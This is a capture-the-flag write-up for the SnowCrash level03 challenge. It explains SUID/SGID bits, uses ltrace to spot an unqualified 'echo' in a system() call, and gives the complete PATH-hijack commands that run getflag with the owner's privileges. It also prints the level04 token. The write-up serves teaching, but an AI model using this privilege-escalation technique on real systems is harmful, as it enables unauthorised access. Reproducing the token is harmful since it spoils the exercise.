# level03

```jsx
level03@SnowCrash:~$ ls -la
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```

Shows that:
- The file level03 belongs to the user flag03 and to the group level03
- SUID and SGID are active
→ I have the right to execute this file as user level03, but the file will execute with the permissions of the owner user flag03 because SUID is active.
- This is the reason why as user level03 I cannot display the flag with getflag, but through the executable file level03, it becomes possible. Because the system checks who executes it and only the permissions of flag03 allow displaying the flag.

The “s” is an execution permission with extra power
→ It means the file is allowed to execute and automatically takes the identities of the owner (SUID) and/or group (SGID) during execution. When an executable has both bits active, the system applies the privileges of both sides simultaneously when launching the process.
- SUID only (rwsr-xr-x): The file takes only the identity of the owner.
- SGID only (r-xr-sr-x): The file takes only the identity of the group.
- SUID + SGID (rwsr-sr-x): The file takes BOTH the identity of the owner AND that of the group.

The “x” is also an execution permission
→ It means the file is allowed to execute with the permissions of the person who launches it.

```jsx
level03@SnowCrash:~$ ./level03
Exploit me
level03@SnowCrash:~$ ltrace ./level03
```

- ltrace: intercepts and displays all calls to shared library functions (e.g., libc)
One line shows the vulnerability: system("/usr/bin/env echo Exploit me”)
→ The vulnerability lies in the use of the “echo” command, used without an absolute path “/bin/echo”.
Consequence: the system must find the location of the echo executable itself:
- It reads the PATH environment variable which contains a list of folders
- It searches in order through these folders until it finds it
- It executes the first echo it finds
The system trusts the PATH variable, so we just need to modify it to execute our own echo file which contains the command getflag.

```jsx
level03@SnowCrash:~$ echo "/bin/getflag" > /tmp/echo
level03@SnowCrash:~$ chmod +x /tmp/echo
level03@SnowCrash:~$ export PATH=/tmp:$PATH
level03@SnowCrash:~$ ./level03
```

- echo "/bin/getflag" > /tmp/echo: writes the command “/bin/getflag” into the /tmp/echo file
- chmod +x /tmp/echo: authorizes the execution of /tmp/echo
- export PATH=/tmp:$PATH: adds the folder containing our “echo” script to the beginning of the PATH environment variable folder list
- ./level03: execution of the binary
→ When the code executes and reaches the call to system("/usr/bin/env echo Exploit me”), the system will search the PATH folders for the first echo file, hit /tmp/echo, and execute the getflag command.
We therefore directly get the token for level04: qi0maab88jeaj46qoumi7maus